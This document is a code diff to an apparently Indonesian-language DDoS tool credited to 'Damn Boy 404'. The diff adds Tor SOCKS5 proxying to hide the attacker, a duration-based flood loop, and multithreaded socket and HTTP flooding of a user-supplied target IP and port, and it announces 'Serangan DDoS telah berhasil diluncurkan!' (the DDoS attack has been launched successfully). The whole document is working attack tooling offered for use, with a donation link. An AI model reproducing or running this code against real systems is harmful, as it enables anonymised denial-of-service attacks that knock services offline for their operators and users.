@@ -5,6 +5,7 @@ import logging
 import os
 import subprocess
 import sys
+import time
 from colorama import init, Fore, Style
 
 def install_and_import(package):
@@ -18,6 +19,7 @@ def install_and_import(package):
 
 install_and_import('colorama')
 install_and_import('requests')
+install_and_import('PySocks')
 
 init(autoreset=True)
 
@@ -37,7 +39,7 @@ logo = f"""
 ██║░░██║██║░░██║██║░░██║░╚═══██╗
 ██████╔╝██████╔╝╚█████╔╝██████╔╝
 ╚═════╝░╚═════╝░░╚════╝░╚═════╝░
-for Feedback • t.me/damn_boy738
+For Feedback and donation • t.me/damn_boy738
 """
 
 author = f"{Fore.RED}{Style.BRIGHT}Author: Damn Boy 404{Style.RESET_ALL}"
@@ -54,8 +56,14 @@ def authenticate():
         print("Token otentikasi tidak valid.")
         return False
 
-def ddos(target_ip, target_port, num_threads):
-    for _ in range(num_threads):
+proxies = {
+    'http': 'socks5h://127.0.0.1:9050',
+    'https': 'socks5h://127.0.0.1:9050'
+}
+
+def ddos(target_ip, target_port, duration):
+    end_time = time.time() + duration
+    while time.time() < end_time:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((target_ip, target_port))
@@ -64,7 +72,7 @@ def ddos(target_ip, target_port, num_threads):
             s.close()
             
             url = f"http://{target_ip}:{target_port}"
-            response = requests.get(url)
+            response = requests.get(url, proxies=proxies)
             status_code = response.status_code
             response_time = response.elapsed.total_seconds()
             print(f"{Fore.GREEN}[STATUS] Situs: {url}, Kode Status: {status_code}, Waktu Respons: {response_time:.2f} detik")
@@ -99,14 +107,20 @@ def login():
 
         target_port = int(input("Masukkan port target: "))
         num_threads = int(input("Masukkan jumlah thread untuk serangan DDoS: "))
+        duration = int(input("Masukkan durasi serangan dalam detik: "))
 
         if num_threads <= 0:
             print("Jumlah thread harus lebih besar dari 0")
             logging.error("Jumlah thread harus lebih besar dari 0")
             return
         
+        if duration <= 0:
+            print("Durasi harus lebih besar dari 0")
+            logging.error("Durasi harus lebih besar dari 0")
+            return
+        
         for _ in range(num_threads):
-            thread = threading.Thread(target=ddos, args=(target_ip, target_port, num_threads))
+            thread = threading.Thread(target=ddos, args=(target_ip, target_port, duration))
             thread.start()
         
         print("Serangan DDoS telah berhasil diluncurkan!")
